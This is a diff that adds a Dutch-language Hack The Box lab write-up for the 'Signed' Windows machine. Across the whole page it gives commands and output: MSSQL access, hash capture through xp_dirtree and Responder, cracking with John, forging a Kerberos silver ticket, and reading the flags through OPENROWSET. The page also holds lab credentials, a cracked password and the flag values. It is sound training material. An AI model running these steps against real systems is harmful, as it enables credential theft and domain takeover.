@@ -1,0 +1,324 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="">
+<meta name="description" content="Machine Information As is common in real life Windows penetration tests, you will start the Signed box with credentials for the following account which can be used to access the MSSQL service: scott / Sm230#C5NatH
+Initial Enumeration Port Scanning Full Port scan As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.
+┌─[eu-dedivip-1]─[10.10.14.75]─[hackthekat123@htb-jwbvhxkfjj]─[~] └──╼ [★]$ nmap 10.129.32.54 Starting Nmap 7.94SVN ( [https://nmap.org](https://nmap.org &#34;https://nmap.org/&#34;) ) at 2025-10-13 03:25 CDT Stats: 0:00:38 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 25.50% done; ETC: 03:27 (0:01:51 remaining) Nmap scan report for 10.129.32.54 Host is up (0.15s latency). Not shown: 999 filtered tcp ports (no-response) PORT STATE SERVICE 1433/tcp open ms-sql-s Nmap done: 1 IP address (1 host up) scanned in 83.40 seconds Detailed port scan At the detailed port scan go to get more information from the services which are open on the ip address.
+" />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="http://localhost:1313/writeups/writeup-signed/" />
+
+
+    <title>
+        
+             :: Hackthekat home 
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="/main.d7ff2d2210fd0ab14f417c6d91d2931b4ecffab189943b30890ff820a24a57c9.css">
+
+
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+
+  <meta itemprop="name" content="Hackthekat home">
+  <meta itemprop="description" content="Machine Information As is common in real life Windows penetration tests, you will start the Signed box with credentials for the following account which can be used to access the MSSQL service: scott / Sm230#C5NatH
+Initial Enumeration Port Scanning Full Port scan As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.
+┌─[eu-dedivip-1]─[10.10.14.75]─[hackthekat123@htb-jwbvhxkfjj]─[~] └──╼ [★]$ nmap 10.129.32.54 Starting Nmap 7.94SVN ( [https://nmap.org](https://nmap.org &#34;https://nmap.org/&#34;) ) at 2025-10-13 03:25 CDT Stats: 0:00:38 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 25.50% done; ETC: 03:27 (0:01:51 remaining) Nmap scan report for 10.129.32.54 Host is up (0.15s latency). Not shown: 999 filtered tcp ports (no-response) PORT STATE SERVICE 1433/tcp open ms-sql-s Nmap done: 1 IP address (1 host up) scanned in 83.40 seconds Detailed port scan At the detailed port scan go to get more information from the services which are open on the ip address.">
+  <meta itemprop="wordCount" content="943">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Hackthekat home">
+  <meta name="twitter:description" content="Machine Information As is common in real life Windows penetration tests, you will start the Signed box with credentials for the following account which can be used to access the MSSQL service: scott / Sm230#C5NatH
+Initial Enumeration Port Scanning Full Port scan As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.
+┌─[eu-dedivip-1]─[10.10.14.75]─[hackthekat123@htb-jwbvhxkfjj]─[~] └──╼ [★]$ nmap 10.129.32.54 Starting Nmap 7.94SVN ( [https://nmap.org](https://nmap.org &#34;https://nmap.org/&#34;) ) at 2025-10-13 03:25 CDT Stats: 0:00:38 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 25.50% done; ETC: 03:27 (0:01:51 remaining) Nmap scan report for 10.129.32.54 Host is up (0.15s latency). Not shown: 999 filtered tcp ports (no-response) PORT STATE SERVICE 1433/tcp open ms-sql-s Nmap done: 1 IP address (1 host up) scanned in 83.40 seconds Detailed port scan At the detailed port scan go to get more information from the services which are open on the ip address.">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text">hello</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner">
+            
+            <div class="submenu">
+                <li class="dropdown">
+                    <a href="/posts/">
+                        Blog
+                    </a>
+                </li>
+            </div>
+            
+        
+            
+                <div class="submenu">
+                    <li class="dropdown">
+                        <a href="/hackthebox/">
+                            Hack The Box
+                        </a>
+                        <div class="dropdown-content">
+                            
+                               <a title="Machines" href="/tags/machines/">
+                                   Machines
+                                </a>
+                            
+                        </div>
+                    </li>
+                </div>
+            
+        
+
+    
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            
+            </p>
+        </div>
+
+        <article>
+            
+                <h2 class="post-title"><a href="http://localhost:1313/writeups/writeup-signed/"></a></h2>
+            
+
+
+            
+            
+            
+
+            <div class="post-content">
+                <h3 id="machine-information">Machine Information</h3>
+<p>As is common in real life Windows penetration tests, you will start the Signed box with credentials for the following account which can be used to access the MSSQL service: scott / Sm230#C5NatH</p>
+<h1 id="initial-enumeration">Initial Enumeration</h1>
+<h2 id="port-scanning">Port Scanning</h2>
+<h3 id="full-port-scan">Full Port scan</h3>
+<p>As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.</p>
+<pre tabindex="0"><code>┌─[eu-dedivip-1]─[10.10.14.75]─[hackthekat123@htb-jwbvhxkfjj]─[~]  
+└──╼ [★]$ nmap 10.129.32.54  
+Starting Nmap 7.94SVN ( [https://nmap.org](https://nmap.org &#34;https://nmap.org/&#34;) ) at 2025-10-13 03:25 CDT  
+Stats: 0:00:38 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan  
+SYN Stealth Scan Timing: About 25.50% done; ETC: 03:27 (0:01:51 remaining)  
+Nmap scan report for 10.129.32.54  
+Host is up (0.15s latency).  
+Not shown: 999 filtered tcp ports (no-response)  
+PORT     STATE SERVICE  
+1433/tcp open  ms-sql-s
+
+Nmap done: 1 IP address (1 host up) scanned in 83.40 seconds  
+</code></pre><h3 id="detailed-port-scan">Detailed port scan</h3>
+<p>At the detailed port scan go to get more information from the services which are open on the ip address.</p>
+<pre tabindex="0"><code>┌─[eu-dedivip-1]─[10.10.14.75]─[hackthekat123@htb-jwbvhxkfjj]─[~]  
+└──╼ [★]$ nmap -p1433 -sCV 10.129.32.54  
+Starting Nmap 7.94SVN ( [https://nmap.org](https://nmap.org &#34;https://nmap.org/&#34;) ) at 2025-10-13 03:29 CDT  
+Nmap scan report for 10.129.32.54  
+Host is up (0.15s latency).
+
+PORT     STATE SERVICE  VERSION  
+1433/tcp open  ms-sql-s Microsoft SQL Server 2022 16.00.1000.00; RC0+  
+| ms-sql-info:   
+|   10.129.32.54:1433:   
+|     Version:   
+|       name: Microsoft SQL Server 2022 RC0+  
+|       number: 16.00.1000.00  
+|       Product: Microsoft SQL Server 2022  
+|       Service pack level: RC0  
+|       Post-SP patches applied: true  
+|_    TCP port: 1433  
+|_ssl-date: 2025-10-13T08:29:48+00:00; 0s from scanner time.  
+| ms-sql-ntlm-info:   
+|   10.129.32.54:1433:   
+|     Target_Name: SIGNED  
+|     NetBIOS_Domain_Name: SIGNED  
+|     NetBIOS_Computer_Name: DC01  
+|     DNS_Domain_Name: SIGNED.HTB  
+|     DNS_Computer_Name: DC01.SIGNED.HTB  
+|     DNS_Tree_Name: SIGNED.HTB  
+|_    Product_Version: 10.0.17763  
+| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback  
+| Not valid before: 2025-10-13T08:25:55  
+|_Not valid after:  2055-10-13T08:25:55  
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+</code></pre><p>Zoals je kan zien is alleen de poort van de mssql server open. Aangezien dat er in de machine information al een username en een password stond. Zal ik deze gaan gebruiken voor in te loggen door gebruik te maken van de mssqlclient.</p>
+<pre tabindex="0"><code>┌─[eu-dedivip-1]─[10.10.14.75]─[hackthekat123@htb-jwbvhxkfjj]─[~]  
+└──╼ [★]$ mssqlclient.py signed.htb/scott:&#39;Sm230#C5NatH&#39;@10.129.32.54  
+</code></pre><p>Ik ben een keer gaan kijken of dat er geen andere servers gelinked waren maar dit was niet het geval. Ik ben daarna eens gaan kijken of dat ik de xp_cmdshell kon gebruiken voor een connectie te maken tussen de server en de windows machine maar dit was ook niet het geval. Ik ben dus de xp_dirtree gaan gebruiken voor het verkrijgen van de hashes.</p>
+<pre tabindex="0"><code>SQL (scott  guest@msdb)&gt; xp_dirtree \\10.10.14.75\shared --&gt; Eigen IP gebruiken  
+subdirectory   depth   file     
+------------   -----   ----
+
+Kali machine
+
+sudo responder -I eth0 --&gt; de interface moet in hetzelfde netwerk zitten als de IP dat je wilt hacken.
+
+[SMB] NTLMv2-SSP Client   : 10.129.32.54  
+[SMB] NTLMv2-SSP Username : SIGNED\mssqlsvc  
+[SMB] NTLMv2-SSP Hash     : mssqlsvc::SIGNED:55518c35a93b48bf:16F2F750845E578802CF45E60890A681:010100000000000080BFF75BFD3BDC011AF0FF28FCD54E6600000000020008004200480032004F0001001E00570049004E002D0033004D0043005300360055004E00480030003100530004003400570049004E002D0033004D0043005300360055004E0048003000310053002E004200480032004F002E004C004F00430041004C00030014004200480032004F002E004C004F00430041004C00050014004200480032004F002E004C004F00430041004C000700080080BFF75BFD3BDC0106000400020000000800300030000000000000000000000000300000EBE9A511D695E0328727F467301D99D9B46294291DBD0257CE2A04CB30F4C6790A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00370035000000000000000000  
+</code></pre><p>Ik ga de hash nu gaan cracken door gebruik te maken van John of hashcat. En zoals je hieronder zult kunnen zien hebben we de hash gecracked.</p>
+<pre tabindex="0"><code>┌─[eu-dedivip-1]─[10.10.14.75]─[hackthekat123@htb-jwbvhxkfjj]─[~]  
+└──╼ [★]$ john --wordlist=/usr/share/wordlists/rocky  
+ou.txt Hash_mssqlsvc   
+Using default input encoding: UTF-8  
+Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])  
+Will run 4 OpenMP threads  
+Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status  
+purPLE9795!@     (mssqlsvc)       
+1g 0:00:00:01 DONE (2025-10-13 05:33) 0.5555g/s 2492Kp/s 2492Kc/s 2492KC/s purcitititya..puppuh  
+Use the &#34;--show --format=netntlmv2&#34; options to display all of the cracked passwords reliably  
+Session completed.  
+</code></pre><p>Ik zal nu een keer gaan inloggen op de mssqlclient met deze user credentials voor het zien welke rechten we hiermee hebben. En voor het zien of ik hiermee geen remote connectie kan maken met de windows machine.</p>
+<pre tabindex="0"><code>mssqlclient.py signed.htb/mssqlsvc:&#39;purPLE9795!@&#39;@10.129.1.135
+Impacket v0.13.0.dev0+20250623.124606.b6b0daec - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Encryption required, switching to TLS
+[-] ERROR(DC01): Line 1: Login failed for user &#39;mssqlsvc&#39;.
+</code></pre><p>We gaan als eerst proberen de sid te verkrijgen. Dit kan je gaan doen door gebruik te maken van het volgende netexec commando.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/Signed]
+└─$ nxc mssql dc01.signed.htb \
+        -u &#39;mssqlsvc&#39; -p &#39;purPLE9795!@&#39; \
+        -q &#34;select SUSER_SID(&#39;SIGNED\Domain Admins&#39;)&#34;
+MSSQL       10.129.1.135    1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:SIGNED.HTB)
+MSSQL       10.129.1.135    1433   DC01             [+] SIGNED.HTB\mssqlsvc:purPLE9795!@ 
+MSSQL       10.129.1.135    1433   DC01             b&#39;0105000000000005150000005b7bb0f398aa2245ad4a1ca400020000&#39;
+</code></pre><p>Nu gaan we de hexdecimale getallen gaan omzetten naar de sid name. Dit kan je gaan doen door gebruik te maken van de volgende tool.</p>
+<pre tabindex="0"><code>hex2sid &#39;0105000000000005150000005b7bb0f398aa2245ad4a1ca400020000&#39;
+S-1-5-21-4088429403-1159899800-2753317549-512
+</code></pre><p>Aangezien dat als ik het password gebruik in plaintext het niet werkt, zal ik deze gaan veranderen naar de NTLM hash. Dit kan je gaan doen door de pypykatz tool te gebruiken.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/Signed]
+└─$ pypykatz crypto nt &#39;purPLE9795!@&#39;
+ef699384c3285c54128a3ee1ddb1a0cc
+</code></pre><p>Nu dat we de NTLM hash hebben kunnen we het zilveren ticket gaan aanmaken. Dit kan je doen door de tool impacket-ticketer te gebruiken.</p>
+<pre tabindex="0"><code>impacket-ticketer -nthash ef699384c3285c54128a3ee1ddb1a0cc -domain-sid S-1-5-21-4088429403-1159899800-2753317549 -domain signed.htb -user-id 1103 -groups 512,519,1105 -spn MSSQLSvc/DC01.SIGNED.HTB:1433 mssqlsvc
+</code></pre><p>Gaan exporteren van de cert</p>
+<pre tabindex="0"><code>export KRB5CCNAME=mssqlsvc.ccache
+</code></pre><p>Door gebruik te maken van het nxc commando kan je dus de user flag en de root flag gaan uitlezen zonder dat je echt zult gaan inloggen op de windows machine. Dit kan je gaan doen door de volgende 2 commando&rsquo;s te gaan gebruiken. Dit heb ik gevonden door gebruik te maken van de volgende url <a href="https://www.mssqltips.com/sqlservertip/1643/using-openrowset-to-read-large-files-into-sql-server/">https://www.mssqltips.com/sqlservertip/1643/using-openrowset-to-read-large-files-into-sql-server/</a></p>
+<pre tabindex="0"><code>User Flag
+
+nxc mssql dc01.signed.htb -u mssqlsvc -k --use-kcache   -q &#34;SELECT * FROM OPENROWSET(BULK &#39;C:\Users\mssqlsvc\desktop\user.txt&#39;, SINGLE_CLOB) AS Contents;&#34;
+MSSQL       dc01.signed.htb 1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:SIGNED.HTB)
+MSSQL       dc01.signed.htb 1433   DC01             [+] SIGNED.HTB\mssqlsvc from ccache (Pwn3d!)
+MSSQL       dc01.signed.htb 1433   DC01             BulkColumn:b&#39;4ee30a66ba99eac8c3b7d3ce2a30c579\r\n&#39;
+
+Root Flag
+
+nxc mssql dc01.signed.htb -u mssqlsvc -k --use-kcache \
+  -q &#34;SELECT * FROM OPENROWSET(BULK &#39;C:\Users\Administrator\Desktop\root.txt&#39;, SINGLE_CLOB) AS Contents;&#34;
+MSSQL       dc01.signed.htb 1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:SIGNED.HTB)
+MSSQL       dc01.signed.htb 1433   DC01             [+] SIGNED.HTB\mssqlsvc from ccache (Pwn3d!)
+MSSQL       dc01.signed.htb 1433   DC01             BulkColumn:b&#39;a052f66d4737e60c165a52d40d5d8c4c\r\n&#39;
+</code></pre><p>ROOTED</p>
+<p>![[Pasted image 20251015195807.png]]</p>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+            
+            
+  		</div>
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    
+    
+        <div class="footer__inner">
+            <div class="footer__content">
+            
+            
+        </div>
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="/bundle.min.efa6b6352b1e4d712533d2fbd29f0c899eb1474e0f181433c934e6c6fdd3678ff834c116423c957d7a6ff6763e9c0d599a82208cdeae81c4a483e37853c46360.js" integrity="sha512-76a2NSseTXElM9L70p8MiZ6xR04PGBQzyTTmxv3TZ4/4NMEWQjyVfXpv9nY&#43;nA1ZmoIgjN6ugcSkg&#43;N4U8RjYA=="></script>
+
+
+
+    </body>
+</html>
